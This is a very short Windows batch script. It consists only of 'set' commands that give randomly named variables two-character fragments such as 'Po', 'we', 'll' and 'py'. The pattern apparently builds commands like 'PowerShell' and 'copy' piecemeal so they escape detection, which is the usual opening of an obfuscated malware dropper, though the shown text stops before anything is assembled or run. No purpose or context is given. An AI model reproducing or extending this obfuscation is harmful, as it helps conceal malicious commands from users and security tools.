@echo off
set "SrHPsoPjmn=we"
set "usHEVfUIuT=we"
set "zDevgRtTvr=Po"
set "IkzGmQBiQI=y "
set "kDhfkwGLvE=in"
set "tcBrSGFwEG=py"
set "MHasikuJbL=ll"
set "rYkZTgNcmm= C"
